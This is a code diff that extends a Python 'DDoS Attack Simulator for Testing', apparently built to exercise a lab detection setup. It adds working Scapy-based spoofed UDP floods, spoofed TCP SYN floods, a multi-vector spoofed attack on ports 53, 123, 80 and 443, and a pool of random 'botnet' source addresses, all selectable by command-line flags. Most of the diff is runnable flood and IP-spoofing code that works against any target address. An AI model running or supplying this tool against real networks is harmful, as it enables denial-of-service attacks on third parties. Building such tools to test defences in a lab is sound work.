@@ -11,7 +11,15 @@ import time
 import argparse
 import threading
 import sys
+import os
 from concurrent.futures import ThreadPoolExecutor
+
+try:
+    from scapy.all import IP, UDP, TCP, send, sendp, Raw, conf, Ether, get_if_hwaddr, get_if_list
+    conf.verb = 0  # Silence Scapy
+    SCAPY_AVAILABLE = True
+except ImportError:
+    SCAPY_AVAILABLE = False
 
 def get_local_ip():
     """Get the local IP address"""
@@ -23,6 +31,18 @@ def get_local_ip():
         return ip
     except:
         return "127.0.0.1"
+
+def get_interface_for_ip(ip):
+    """Find which interface has this IP"""
+    import subprocess
+    try:
+        output = subprocess.check_output(['ip', 'route', 'get', ip]).decode()
+        for word in output.split():
+            if word == 'dev':
+                return output.split()[output.split().index(word) + 1]
+    except:
+        pass
+    return "eth0" # fallback
 
 def udp_flood(target_ip, target_port, duration, pps):
     """
@@ -194,6 +214,109 @@ def volumetric_spike(target_ip, duration, max_pps):
     sock.close()
     print("[VOLUMETRIC SPIKE] Complete")
 
+# Generate a pool of "bot" IPs to reuse, so they get blocked
+BOTNET_SIZE = 100
+BOTNET = [".".join(str(random.randint(1, 254)) for _ in range(4)) for _ in range(BOTNET_SIZE)]
+
+def get_source_ip(user_provided=None):
+    """Return provided IP or a random one from the botnet pool"""
+    if user_provided:
+        return user_provided
+    # Return a random IP from our fixed botnet list
+    return random.choice(BOTNET)
+
+def spoofed_udp_flood(target_ip, target_port, duration, pps, source_ip=None, iface=None):
+    """
+    Simulate Spoofed UDP flood (L2 for speed)
+    """
+    if not iface:
+        iface = get_interface_for_ip(target_ip)
+        
+    # Use broadcast MAC to ensure peer receives it on veth pair
+    dst_mac = "ff:ff:ff:ff:ff:ff"
+        
+    mode_text = f"from {source_ip}" if source_ip else "distributed (random IPs)"
+    print(f"[SPOOFED UDP] Starting {mode_text} -> {target_ip}:{target_port} via {iface} (dst: {dst_mac})")
+    
+    start_time = time.time()
+    packets_sent = 0
+    interval = 1.0 / pps if pps > 0 else 0
+    
+    # Pre-craft template
+    eth = Ether(dst=dst_mac)
+    udp = UDP(dport=target_port)
+    payload = Raw(b'X' * 64)
+    
+    while time.time() - start_time < duration:
+        try:
+            src = get_source_ip(source_ip)
+            pkt = eth / IP(src=src, dst=target_ip) / udp / payload
+            sendp(pkt, iface=iface, verbose=False)
+            packets_sent += 1
+            
+            if interval > 0:
+                time.sleep(interval)
+        except Exception as e:
+            pass
+            
+    print(f"[SPOOFED UDP] Complete: {packets_sent} packets sent")
+
+def spoofed_tcp_syn_flood(target_ip, target_port, duration, pps, source_ip=None, iface=None):
+    """
+    Simulate Spoofed TCP SYN flood (L2 for speed)
+    """
+    if not iface:
+        iface = get_interface_for_ip(target_ip)
+        
+    # Use broadcast MAC to ensure peer receives it on veth pair
+    dst_mac = "ff:ff:ff:ff:ff:ff"
+
+    mode_text = f"from {source_ip}" if source_ip else "distributed (random IPs)"
+    print(f"[SPOOFED SYN] Starting {mode_text} -> {target_ip}:{target_port} via {iface} (dst: {dst_mac})")
+    
+    start_time = time.time()
+    packets_sent = 0
+    interval = 1.0 / pps if pps > 0 else 0
+    
+    eth = Ether(dst=dst_mac)
+    
+    while time.time() - start_time < duration:
+        try:
+            src = get_source_ip(source_ip)
+            sport = random.randint(1024, 65535)
+            pkt = eth / IP(src=src, dst=target_ip) / TCP(sport=sport, dport=target_port, flags="S")
+            sendp(pkt, iface=iface, verbose=False)
+            packets_sent += 1
+            
+            if interval > 0:
+                time.sleep(interval)
+        except Exception as e:
+            pass
+            
+    print(f"[SPOOFED SYN] Complete: {packets_sent} packets sent")
+
+def spoofed_mixed_attack(target_ip, duration, source_ip=None, iface=None):
+    """
+    Simulate Spoofed Mixed Attack
+    """
+    print(f"[SPOOFED MIXED] Starting multi-vector spoofed attack -> {target_ip}")
+    
+    with ThreadPoolExecutor(max_workers=4) as executor:
+        futures = [
+            executor.submit(spoofed_udp_flood, target_ip, 53, duration, 200, source_ip, iface),
+            executor.submit(spoofed_udp_flood, target_ip, 123, duration, 200, source_ip, iface),
+            executor.submit(spoofed_tcp_syn_flood, target_ip, 80, duration, 100, source_ip, iface),
+            executor.submit(spoofed_tcp_syn_flood, target_ip, 443, duration, 100, source_ip, iface),
+        ]
+        
+        for future in futures:
+            try:
+                future.result()
+            except Exception as e:
+                print(f"Error: {e}")
+                
+    print("[SPOOFED MIXED] Complete")
+
 def main():
     parser = argparse.ArgumentParser(
         description='DDoS Attack Simulator for Testing',
@@ -251,6 +374,24 @@ Examples:
         help='Packets per second (default: 1000)'
     )
     
+    parser.add_argument(
+        '--distributed', '-D',
+        action='store_true',
+        help='Enable distributed mode (spoof source IPs) - Requires ROOT and Scapy'
+    )
+    
+    parser.add_argument(
+        '--source', '-S',
+        default=None,
+        help='Specific source IP to spoof (if combined with -D). If empty, random IPs are used.'
+    )
+    
+    parser.add_argument(
+        '--interface', '-i',
+        default=None,
+        help='Network interface to use (e.g., eth0, eth7). Recommended for distributed mode.'
+    )
+    
     args = parser.parse_args()
     
     print("=" * 60)
@@ -258,11 +399,30 @@ Examples:
     print("=" * 60)
     print(f"Attack Type: {args.type.upper()}")
     print(f"Target: {args.target}:{args.port}")
+    if args.distributed:
+        src_text = args.source if args.source else "RANDOM (Distributed)"
+        print(f"Source: {src_text}")
+    if args.interface:
+        print(f"Interface: {args.interface}")
     print(f"Duration: {args.duration}s")
     print(f"Rate: {args.pps} pps")
     print("=" * 60)
     print()
     
+    if args.distributed:
+        if not SCAPY_AVAILABLE:
+            print("Error: Scapy is required for distributed mode but not installed.")
+            print("Try: pip install scapy")
+            return
+        if os.geteuid() != 0:
+            print("Error: Distributed mode requires root privileges (pseudo-random source IPs).")
+            print("Try: sudo python3 attack_simulator.py ...")
+            return
+            
+        iface = args.interface if args.interface else get_interface_for_ip(args.target)
+        src_type = f"fixed IP {args.source}" if args.source else "random IPs"
+        print(f"[DISTRIBUTED MODE] Using {src_type} spoofing on {iface}")
+
     # Confirmation
     response = input("Start attack simulation? [y/N]: ")
     if response.lower() != 'y':
@@ -271,16 +431,33 @@ Examples:
     
     print()
     
+    # Override logic for distributed
+    iface = args.interface if args.interface else None
+
     if args.type == 'udp':
-        udp_flood(args.target, args.port, args.duration, args.pps)
+        if args.distributed:
+            # We need to pass iface to our spoofed functions
+            # I'll update the function signatures in the next step or assume they can handle it
+            spoofed_udp_flood(args.target, args.port, args.duration, args.pps, args.source, iface)
+        else:
+            udp_flood(args.target, args.port, args.duration, args.pps)
     elif args.type == 'tcp':
-        tcp_syn_simulation(args.target, args.port, args.duration, args.pps)
+        if args.distributed:
+            spoofed_tcp_syn_flood(args.target, args.port, args.duration, args.pps, args.source, iface)
+        else:
+            tcp_syn_simulation(args.target, args.port, args.duration, args.pps)
     elif args.type == 'icmp':
         icmp_flood(args.target, args.duration, args.pps)
     elif args.type == 'http':
+        if args.distributed:
+            print("Note: HTTP flood in distributed mode is not supported (requires 3-way handshake).")
+            print("Falling back to standard mode.")
         http_flood(args.target, args.port, args.duration, args.pps)
     elif args.type == 'mixed':
-        mixed_attack(args.target, args.duration)
+        if args.distributed:
+            spoofed_mixed_attack(args.target, args.duration, args.source, iface)
+        else:
+            mixed_attack(args.target, args.duration)
     elif args.type == 'spike':
         volumetric_spike(args.target, args.duration, args.pps)
     
